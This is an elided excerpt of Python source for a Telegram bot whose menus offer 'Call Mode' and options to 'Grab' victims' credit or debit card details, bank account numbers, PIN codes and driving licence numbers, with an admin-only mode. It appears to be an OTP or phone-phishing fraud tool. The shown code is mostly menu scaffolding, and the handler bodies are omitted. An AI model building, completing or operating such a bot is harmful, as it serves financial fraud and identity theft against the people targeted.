...
def send_welcome(message):
    ...
    if check_admin(id) == True:
        ...
        item2 = types.KeyboardButton(text="krisanjit mode")
        keyboard.add(item1)
        keyboard.add(item2)
...
def call_or_sms_or_script(message):
    ...
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="📞Call Mode☎️")
...
def send_text(message):
    ...
    try:
        ...
        bot.send_message(chat_id, "An error has occured , contact admin @Wolphite")
...
def card_or_Otp(message):
    ...
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Grab credit/Debit Card Details 💳")
    item2 = types.KeyboardButton(text="Grab Bank Account # 🏦")
    item3 = types.KeyboardButton(text="Grab PIN code 📌")
    ...
    item7 = types.KeyboardButton(text="Grab Driding license  # 🚘")
    keyboard.add(item1)
...
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "krisanjit mode")
...
@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab credit/debit Card Details 💳")
